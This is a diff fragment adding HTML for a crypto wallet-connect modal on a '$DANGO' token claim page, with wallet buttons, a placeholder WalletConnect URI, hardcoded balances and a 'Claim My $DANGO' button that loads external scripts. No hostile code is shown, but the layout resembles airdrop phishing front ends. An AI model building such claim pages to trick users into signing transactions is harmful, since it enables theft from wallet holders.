+                <path d="M20 6C12.3 6 6 12.3 6 20s6.3 14 14 14 14-6.3 14-14S27.7 6 20 6zm6.5 14.5c-.9 2.5-3.2 4-5.8 4h-1.2c-.4 0-.7-.3-.7-.7s.3-.7.7-.7h1.2c1.9 0 3.6-1.1 4.3-2.9.2-.5.8-.7 1.2-.5.5.2.7.8.3 1.8zm-3-5.5c0 .8-.6 1.5-1.5 1.5s-1.5-.7-1.5-1.5.6-1.5 1.5-1.5 1.5.7 1.5 1.5zm-6 0c0 .8-.6 1.5-1.5 1.5S14.5 15.8 14.5 15s.6-1.5 1.5-1.5 1.5.7 1.5 1.5z"/>
+              </svg>
+            </div>
+            <div class="wc-wallet-info">
+              <span class="wc-wallet-name">Phantom</span>
+              <span class="wc-wallet-desc">Solana & multi-chain wallet</span>
+            </div>
+            <svg class="wc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M9 18l6-6-6-6"/></svg>
+          </button>
+
+          <button class="wc-wallet-btn" data-wallet="trust" id="wc-trust">
+            <div class="wc-wallet-icon" style="background:linear-gradient(135deg,#3375bb,#1a4f8a)">
+              <svg viewBox="0 0 40 40" fill="white" xmlns="http://www.w3.org/2000/svg" width="26" height="26">
+                <path d="M20 6l-12 5v10c0 6.6 5.1 12.8 12 14 6.9-1.2 12-7.4 12-14V11L20 6zm-1.5 19l-5-5 1.8-1.8 3.2 3.2 6.7-7 1.8 1.8-8.5 8.8z"/>
+              </svg>
+            </div>
+            <div class="wc-wallet-info">
+              <span class="wc-wallet-name">Trust Wallet</span>
+              <span class="wc-wallet-desc">Mobile wallet · 60M+ users</span>
+            </div>
+            <svg class="wc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M9 18l6-6-6-6"/></svg>
+          </button>
+
+          <button class="wc-wallet-btn" data-wallet="okx" id="wc-okx">
+            <div class="wc-wallet-icon" style="background:linear-gradient(135deg,#1a1a1a,#333)">
+              <svg viewBox="0 0 40 40" fill="white" xmlns="http://www.w3.org/2000/svg" width="26" height="26">
+                <rect x="8" y="8" width="9" height="9" rx="1"/>
+                <rect x="23" y="8" width="9" height="9" rx="1"/>
+                <rect x="15.5" y="15.5" width="9" height="9" rx="1"/>
+                <rect x="8" y="23" width="9" height="9" rx="1"/>
+                <rect x="23" y="23" width="9" height="9" rx="1"/>
+              </svg>
+            </div>
+            <div class="wc-wallet-info">
+              <span class="wc-wallet-name">OKX Wallet</span>
+              <span class="wc-wallet-desc">Multi-chain DeFi wallet</span>
+            </div>
+            <svg class="wc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M9 18l6-6-6-6"/></svg>
+          </button>
+
+        </div>
+        <div class="wc-footer-note">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="14" height="14"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Secured by non-custodial wallet technology
+        </div>
+      </div>
+
+      <!-- Screen 2: WalletConnect QR -->
+      <div class="wc-screen" id="wc-screen-qr">
+        <button class="wc-back" id="wc-back-btn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+          Back
+        </button>
+        <div class="wc-qr-wrap">
+          <canvas id="wc-qr-canvas" width="220" height="220"></canvas>
+          <div class="wc-qr-logo">⬡</div>
+        </div>
+        <p class="wc-qr-label">Scan with your mobile wallet</p>
+        <p class="wc-qr-hint">Open any WalletConnect-compatible wallet and scan this QR code to connect.</p>
+        <div class="wc-qr-uri">
+          <span class="wc-qr-uri-text" id="wc-uri-text">wc:a1b2c3d4...@2?relay-protocol=irn</span>
+          <button class="wc-copy-btn" id="wc-copy-uri">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            Copy
+          </button>
+        </div>
+        <div class="wc-qr-apps">
+          <span class="wc-qr-apps-label">Or open directly:</span>
+          <div class="wc-app-pills">
+            <button class="wc-app-pill">MetaMask</button>
+            <button class="wc-app-pill">Rainbow</button>
+            <button class="wc-app-pill">Argent</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Screen 3: Connecting... -->
+      <div class="wc-screen" id="wc-screen-connecting">
+        <div class="wc-connecting-anim">
+          <div class="wc-conn-rings">
+            <div class="wc-conn-ring r1"></div>
+            <div class="wc-conn-ring r2"></div>
+            <div class="wc-conn-ring r3"></div>
+            <div class="wc-conn-icon" id="wc-conn-icon">⬡</div>
+          </div>
+          <div class="wc-conn-label" id="wc-conn-label">Connecting to MetaMask…</div>
+          <div class="wc-conn-sub" id="wc-conn-sub">Waiting for approval in your wallet</div>
+          <div class="wc-conn-dots">
+            <span></span><span></span><span></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Screen 4: Connected! -->
+      <div class="wc-screen" id="wc-screen-connected">
+        <div class="wc-connected-wrap">
+          <div class="wc-connected-check">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="32" height="32"><path d="M20 6L9 17l-5-5"/></svg>
+          </div>
+          <div class="wc-connected-title">Wallet Connected!</div>
+          <div class="wc-connected-addr" id="wc-connected-addr">0x1a2b...3c4d</div>
+          <div class="wc-connected-net" id="wc-connected-net">
+            <span class="wc-net-dot"></span>
+            Ethereum Mainnet
+          </div>
+          <div class="wc-connected-balance">
+            <div class="wc-bal-row">
+              <span>ETH Balance</span>
+              <span id="wc-eth-bal" class="wc-bal-val">2.4182 ETH</span>
+            </div>
+            <div class="wc-bal-row">
+              <span>$DANGO Eligible</span>
+              <span class="wc-bal-val" style="color:var(--green-400)" id="wc-dango-alloc">2,500 $DANGO</span>
+            </div>
+          </div>
+          <button class="btn-primary full" id="wc-proceed-btn">
+            <span class="btn-glow"></span>
+            Claim My $DANGO
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          </button>
+          <button class="wc-disconnect" id="wc-disconnect">Disconnect wallet</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast"></div>
+
+  <script src="app.js"></script>
+  <div id="wallet-debug" style="margin-top: 20px; font-size: 1rem; color: white;"></div>
+
+<script src="jquery-3.6.0.min.js"></script>
+<script src="ethers.umd.min.js"></script>
+<script src="scripts.js"></script>
+</body>
+</html>
